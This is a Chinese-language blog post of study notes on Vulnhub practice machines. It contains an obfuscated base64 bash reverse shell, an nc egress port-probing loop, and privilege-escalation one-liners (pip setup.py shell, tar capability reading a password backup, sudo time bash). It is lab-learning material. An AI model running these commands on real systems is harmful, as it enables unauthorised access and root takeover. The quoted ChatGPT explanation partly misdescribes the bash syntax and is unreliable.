<!DOCTYPE html><html class="appearance-auto" lang="en"><head><meta charset="UTF-8"><title>vulnhub_learning</title><meta name="description" content="Buona notte"><meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no, initial-scale=1"><!-- Google Analytics --><!-- End Google Analytics -->
<!-- Baidu Analytics --><!-- End Baidu Analytics --><link rel="icon" href="/images/favicon.ico"><link rel="stylesheet" href="/style/common/bulma.css"><link rel="stylesheet" href="/style/base.css"><link rel="stylesheet" href="/style/common/helper.css"><script src="/js/common.js"></script><link rel="stylesheet" href="/style/post.css"><link rel="stylesheet" href="/style/themes/highlight-theme-light.css"><link rel="stylesheet" href="/style/common/jquery.fancybox.min.css"><script src="/js/highlight.pack.js"></script><meta name="description" content="记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等


THE PLANETS: EARTHVulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)

这个靶机不同于之前只扫描http协议，需要连httpx一起扫描

其中需要进行异或加密解密

RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：
bash -c &amp;#39;&amp;#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;#39;

这里查询.."><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Salve" type="application/atom+xml">
</head><body class="is-flex is-flex-direction-column"><header class="header-widget is-flex-shrink-0 is-hidden-mobile"><div class="container is-fullhd is-flex is-justify-content-space-between is-align-items-center is-full-height"><section class="is-hidden-mobile is-flex-shrink-0"><h2><a href="/">Taninluv's blog</a></h2></section><h3 class="is-hidden-mobile is-family-serif is-full-height is-flex is-align-items-center is-flex-shrink-0"><div class="is-full-height" id="postTopic"><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">vulnhub_learning</p><p class="is-full-height is-flex-shrink-0 is-flex is-align-items-center is-justify-content-center">Click back to the top</p></div></h3><aside class="is-flex-shrink-0"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></aside></div></header><header class="is-flex header-widget is-flex-shrink-0 is-align-items-center is-justify-content-center is-hidden-tablet"><h3 class="is-inline-block"><a href="/">Home</a></h3><h3 class="is-inline-block"><a href="/about">About</a></h3><h3 class="is-inline-block"><a href="/archives">Archives</a></h3></header><main><main class="container is-max-widescreen content section post-page pt-4 px-4"><div class="columns is-flex-desktop is-justify-content-center is-flex-direction-row-reverse"><div class="column is-3 is-hidden-mobile"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#THE-PLANETS-EARTH"><span class="toc-text">THE PLANETS: EARTH</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JANGOW"><span class="toc-text">JANGOW</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#red"><span class="toc-text">red</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#napping-1-0-1-ova"><span class="toc-text">napping-1.0.1.ova.</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EMPIRE-BREAKOUT"><span class="toc-text">EMPIRE: BREAKOUT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Vulnhub-Empire-LupinOne"><span class="toc-text">Vulnhub-Empire: LupinOne</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#thale"><span class="toc-text">thale</span></a></li></ol></div><div class="column is-9"><header class="my-4"><a href="/tags/vulnhub"><i class="tag post-item-tag">vulnhub</i></a></header><h1 class="mt-0 mb-1 is-family-serif" id="postTitle">vulnhub_learning</h1><time class="has-text-grey" datetime="2023-08-12T03:34:50.000Z">2023-08-12</time><article class="mt-2 post-content"><p>记录一些在打靶学习的时候遇到的一些有意思的idea或者方法等</p>
<span id="more"></span>

<h1 id="THE-PLANETS-EARTH"><a href="#THE-PLANETS-EARTH" class="headerlink" title="THE PLANETS: EARTH"></a>THE PLANETS: EARTH</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15638010.html">Vulnhub 靶场 THE PLANETS: EARTH - sainet - 博客园 (cnblogs.com)</a></p>
<ul>
<li><p>这个靶机不同于之前只扫描http协议，需要连httpx一起扫描</p>
</li>
<li><p>其中需要进行异或加密解密</p>
</li>
<li><p>RCE反弹shell的时候被禁用了远程连接，可以使用十六进制编码后直接绕过，或者base64，但是需要一点技巧：</p>
<pre><code>bash -c &#39;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwMS8yNTAwMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39;
</code></pre>
<p>这里查询了一下这个逗号：</p>
</li>
</ul>
<pre><code class="GPT">echo 后面直接跟着逗号 ,，这实际上是一种不常见但合法的写法，被称为 Brace Expansion（花括号扩展）。

在 Bash 中，花括号 &#123;&#125; 可以用于创建一组字符串的扩展，其中逗号分隔每个字符串。这种写法在很多情况下可以用来生成一系列的值。
这里的 echo 和 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ== 是一对值，逗号分隔了这两个值。在这个上下文中，它的目的似乎是将一个值（YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU1Ni4xMDEvMjUwMDEgMD4mMQ==）传递给 echo 命令。

在子命令中，逗号 , 用于分隔多个子命令，以便按顺序执行它们。
</code></pre>
<ul>
<li><p>靶机中提权时发现缺少二进制文件reset_root的触发器，需要进行调试查看，创建触发器</p>
</li>
<li><p>提权部分看到了两种调试工具：</p>
<ul>
<li><p>strings：<code>strings</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，它用于从二进制文件中提取可打印的字符串。当您需要检查一个二进制文件（如可执行文件、库文件等）中是否包含文本信息，或者需要分析文件中的字符串时，可以使用 <code>strings</code> 命令。</p>
<p>以下是一些常用的 <code>strings</code> 命令选项：</p>
<ul>
<li><code>-n length</code>：指定最小字符串长度。默认情况下，<code>strings</code> 提取长度至少为 4 个字符的字符串。</li>
<li><code>-a</code>：显示所有的字符串，而不仅仅是可打印字符的字符串。</li>
<li><code>-o</code>：将结果以字符串的偏移量（在文件中的位置）形式输出。</li>
<li><code>-t format</code>：指定输出的字符串格式，可以是 d (十进制)、o (八进制)、x (十六进制)。</li>
<li><code>-e encoding</code>：指定输入文件的字符编码。</li>
<li><code>-h</code>：显示命令的帮助信息。</li>
</ul>
</li>
<li><p>strace： <code>strace</code> 是一个在 Linux 和类 Unix 操作系统中的命令行工具，用于跟踪和记录应用程序执行期间的系统调用和信号。通过使用 <code>strace</code>，您可以查看一个程序与操作系统之间的交互，以及它执行过程中发生的系统调用、信号和其他相关信息。这对于诊断问题、分析性能瓶颈以及理解程序的行为非常有用。</p>
<p>以下是一些常用的 <code>strace</code> 命令选项：</p>
<ul>
<li><code>-o file</code>：将跟踪信息输出到指定文件中，而不是输出到终端。</li>
<li><code>-e trace</code>：指定要跟踪的系统调用。例如，<code>-e open,read</code> 只会跟踪 <code>open</code> 和 <code>read</code> 系统调用。</li>
<li><code>-p pid</code>：跟踪一个已经运行的进程，而不是启动一个新的命令。</li>
<li><code>-f</code>：同时跟踪子进程。对于多进程应用程序，这可以捕获整个进程树的系统调用。</li>
<li><code>-s size</code>：限制输出的字符串长度，避免输出过长。</li>
<li><code>-c</code>：统计系统调用和出错情况的统计信息。</li>
<li><code>-h</code>：显示命令的帮助信息。</li>
</ul>
</li>
</ul>
</li>
</ul>
<blockquote>
<p>strace -o output.txt ls -l</p>
<p>这个命令将会跟踪 <code>ls -l</code> 命令的执行过程，并将跟踪信息输出到名为 <code>output.txt</code> 的文件中。</p>
</blockquote>
<h1 id="JANGOW"><a href="#JANGOW" class="headerlink" title="JANGOW"></a>JANGOW</h1><ul>
<li>有时候防火墙禁用nc -e 操作需要我们使用管道文件或者上传nc文件反弹shell，然后可以通过pty等一句话提权为交互式shell</li>
<li>其实一般的服务器做端口限制都不会限制80和443，可以把433作为反弹的端口，也可以用脚本简单探测一下：</li>
<li><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308131125722.png" alt="image"></li>
</ul>
<pre><code>for i in &#123;1..65535&#125;;do timeout 1 nc -vz 192.168.11.128 $i &amp;&amp; echo &quot;$i open&quot;&gt;&gt; out.txt || echo &quot;si closed&quot; &gt;&gt; out.txt;done
</code></pre>
<p>脚本的工作原理如下：</p>
<ol>
<li>使用 <code>for</code> 循环迭代端口范围从 1 到 65535。</li>
<li>对每个端口，使用 <code>timeout</code> 命令在 1 秒内尝试使用 <code>nc</code> 命令连接到指定的 IP 地址和端口。</li>
<li>如果连接成功，将输出 “$i open” 到 <code>out.txt</code> 文件。</li>
<li>如果连接失败（超时或连接被拒绝），将输出 “si closed” 到 <code>out.txt</code> 文件。</li>
<li><code>nc -vz</code> 是 <code>nc</code>（netcat）命令的一种使用方式，用于进行基本的网络连接测试和端口扫描。下面是对 <code>-vz</code> 参数的解释：<ul>
<li><code>-v</code>: 这个选项表示 “verbose”，即详细输出模式。当您使用 <code>-v</code> 参数时，<code>nc</code> 命令会显示更多关于连接和操作的详细信息，包括成功连接时的信息。</li>
<li><code>-z</code>: 这个选项表示 “zero-I&#x2F;O mode”，即零 I&#x2F;O 模式。在此模式下，<code>nc</code> 命令只会尝试建立连接，而不会进行实际的数据传输。这在执行端口扫描时很有用，因为它不会向目标发送任何实际的数据。</li>
</ul>
</li>
</ol>
<p>这里在博客<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15642784.html">Vulnhub 靶场 JANGOW: 1.0.1 - sainet - 博客园 (cnblogs.com)</a>中还提到一个端口绑定：</p>
<pre><code>sudo iptables -A PREROUTING -t nat -p tcp --dport 1:65535 -j REDIRECT --to-port 1234
</code></pre>
<blockquote>
<ul>
<li><code>iptables</code>: Linux 上的防火墙管理工具。</li>
<li><code>-A PREROUTING</code>: 添加规则到 PREROUTING 链，这是网络数据包进入路由处理之前的链。</li>
<li><code>-t nat</code>: 指定操作的表类型为 “nat”，用于网络地址转换。</li>
<li><code>-p tcp</code>: 指定匹配 TCP 协议的数据包。</li>
<li><code>--dport 1:65535</code>: 匹配目标端口范围从 1 到 65535。</li>
<li><code>-j REDIRECT --to-port 1234</code>: 如果匹配，将数据包重定向到本地的 1234 端口。</li>
</ul>
</blockquote>
<h1 id="red"><a href="#red" class="headerlink" title="red"></a>red</h1><p>这是目前位置做到最好的靶机</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/upfine/p/16783668.html">upfine的博客 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dgs1mple/p/16035221.html#">你终于回来了(。・∀・)ノ (cnblogs.com)</a></p>
<ul>
<li><p>在web部分扫描到后文文件后打开是空白，此时需要再爆破一个参数进行传值</p>
</li>
<li><p>使用hashcat对密码行规则转换</p>
</li>
<li><p>提权部分切换用户打开shell：</p>
<p>sudo -u ippsec &#x2F;usr&#x2F;bin&#x2F;time &#x2F;bin&#x2F;bash</p>
</li>
<li><p>在拿到shell后，</p>
<ul>
<li>一个是查找用户有权限的文件</li>
</ul>
<p>find &#x2F; -group ippsec -type d 2&gt;&#x2F;dev&#x2F;null | grep -v proc.</p>
<p>（他这里其实是查找的的目录-type d 而不是文件 -type f）</p>
<ul>
<li>另一个博主是上传<a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s">pspy64s</a>监听系统运行的程序，然后发现了后门文件</li>
</ul>
</li>
</ul>
<p>在日志里发现执行后门代码的记录，命令：vi &#x2F;var&#x2F;log&#x2F;syslog，也查看了定时任务：vim &#x2F;etc&#x2F;crontab</p>
<p>使用命令：crontab -l可以查看执行后门文件的定时任务</p>
<h1 id="napping-1-0-1-ova"><a href="#napping-1-0-1-ova" class="headerlink" title="napping-1.0.1.ova."></a>napping-1.0.1.ova.</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15650122.html">Vulnhub 靶场 NAPPING: 1.0.1 - sainet - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/csacs/article/details/104535225">Reverse Tabnabbing钓鱼_SoulCat.的博客-CSDN博客</a></p>
<p>这个靶机涉及到网络钓鱼，原理和刚学到的XSS差不多，但是Tab好像不需要设置钓鱼表单，在满足漏洞的情况下好像只需要监听端口就能接收到用户表单，这应该涉及到表单的提交和保存方式</p>
<p>提权部分修改py文件时使用的shell是 &#x2F;usr&#x2F;bin&#x2F;bash 而不是 &#x2F;bin&#x2F;shell执行脚本（在py文件中）,询问GPT一般用户也是可以使用&#x2F;bin&#x2F;bash的，但是这里可能是设置了权限，以后插入py文件应该要先测试相关情况。</p>
<p>vim提权时使用<code>！</code>可以执行外部shell命令，以此提权</p>
<h1 id="EMPIRE-BREAKOUT"><a href="#EMPIRE-BREAKOUT" class="headerlink" title="EMPIRE: BREAKOUT"></a>EMPIRE: BREAKOUT</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15682132.html#3-10000-%E7%AB%AF%E5%8F%A3">Vulnhub 靶场 EMPIRE: BREAKOUT - sainet - 博客园 (cnblogs.com)</a></p>
<p>在web部分需要使用enum4linux工具检测服务器上的smb用户结合找到的密码登录后台，smbmap更适合当作客户端登录</p>
<p>提权部分需要寻找一些可用文件，一般来说对于网站可以寻找一些配置文件<code>*.conf</code> <code>*.config</code>等文件，对于本地提权则可以寻找一些隐藏文件、有权限的文件、密码文件等</p>
<p>这里白给了一个tar命令，使用getcap查看发现read&#x3D;ep，可以通过加解压对一些文件越权访问，命令：</p>
<p><code>./tar -cvf pass.tar /var/backups/.old_pass.bak</code></p>
<ul>
<li><code>-c</code>: 表示创建一个新的归档文件。</li>
<li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li>
<li><code>-f</code>: 后面紧跟着要创建的归档文件的名称。</li>
</ul>
<p><code>./tar -xvf pass.tar </code></p>
<ul>
<li><code>-x</code>: 表示从归档文件中提取（解压缩）文件。</li>
<li><code>-v</code>: 表示在执行过程中显示详细的处理信息。</li>
<li><code>-f</code>: 后面紧跟着要提取的归档文件的名称。</li>
</ul>
<h1 id="Vulnhub-Empire-LupinOne"><a href="#Vulnhub-Empire-LupinOne" class="headerlink" title="Vulnhub-Empire: LupinOne"></a>Vulnhub-Empire: LupinOne</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/C0ngvv/p/15607026.html">Vulnhub-Empire: LupinOne题解 - C0ngvv - 博客园 (cnblogs.com)</a></p>
<p>这里挺有意思的，在爬虫文件中找到了一个：</p>
<p><img src="https://img2020.cnblogs.com/blog/2419541/202111/2419541-20211126115020078-347234152.png" alt="img"></p>
<p>在而后的扫描中使用<code>~FUZZ</code>查找文件，这实际算得上一个提示hh。</p>
<p>在ssh密钥登录时，使用ssh -i 指定ssh_key</p>
<p>这里遇到一个Enter passphrase for key</p>
<blockquote>
<p>GPT:<br>在 SSH 连接时，”passphrase” 是指用于保护 SSH 私钥的密码。私钥是 SSH 密钥对中的一部分，用于对连接进行身份验证和加密通信。私钥需要受到保护，以防止未经授权的访问。</p>
<p>通常情况下，SSH 密钥对由两部分组成：公钥和私钥。公钥存储在远程服务器上，而私钥存储在本地机器上。当您尝试进行 SSH 连接时，您的私钥将用于身份验证。</p>
<p>如果您的私钥设置了 passphrase（也称为密码短语），则在每次使用私钥进行身份验证时，您都需要输入这个 passphrase。这增加了私钥的安全性，因为即使其他人获得了您的私钥文件，他们也无法在没有知道 passphrase 的情况下使用它。</p>
</blockquote>
<p>在提权时给的特权命令制定了非root用户，只能横向移动：</p>
<p><img src="https://img2022.cnblogs.com/blog/2834847/202210/2834847-20221019211337697-77786398.png" alt="img"></p>
<p><img src="https://img2022.cnblogs.com/blog/2834847/202210/2834847-20221019215635820-265891080.png" alt="img"></p>
<p>最后提权部分用到pip，文件给的提权代码：</p>
<pre><code>TF=$(mktemp -d)
echo &quot;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF/setup.py
pip install $TF
</code></pre>
<p>核心部分还有点疑惑，留个引子</p>
<h1 id="thale"><a href="#thale" class="headerlink" title="thale"></a>thale</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15655638.html">Vulnhub 靶场 THALES: 1 - sainet - 博客园 (cnblogs.com)</a></p>
<p>这个靶机只能说中规中矩吧，web部分用到了msf 和msfveno，感觉很少用到msfveno但确实挺好用的</p>
<p>提权部分几个博客园的博主讲得都不算很好，尤其是用backup.sh反弹root shell 时为什么等一会就能连接上，我查看了crontab和ps aux ，没有root是看不到定时任务，只有在ps进程中看到了备份脚本在被root执行：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181112204.png" alt="image-20230818111232141"></p>
<p>root:</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181113859.png" alt="image-20230818111307806"></p>
<p>这里看到脚本5min执行一次</p>
<p>我们根据脚本指引来到保存备份文件的地方，发现上一次备份在5分钟前：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181116917.png" alt="image-20230818111611873"></p>
<p>（其实这里是写文章的时候刚好过了五分钟被截到），一般而言是可以看到上一次备份在几分钟前从而确证它可以自动执行备份。</p>
<p>最后有提个挺有意思的是，横向移动的时候发现su提示需要一个终端，而使用pty提权后就可以移动了</p>
<p>大概查了一下：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sainet/p/15783539.html">Linux 反向 shell 升级为完全可用的 TTY shell - sainet - 博客园 (cnblogs.com)</a></p>
<p>推测nc得到的shell比较受限，查询了一下TTY：</p>
<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202308181124899.png" alt="image-20230818112416855"></p>
<p>这里看到一直用的一句话提权实际上是伪终端（那就是说伪终端也算终端咯？）</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/08/15/XSS/" title="XSS"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: XSS</span></a><a class="button is-default" href="/2023/08/10/SERVICES/" title="attacking SERVICES"><span class="has-text-weight-semibold">Next: attacking SERVICES</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>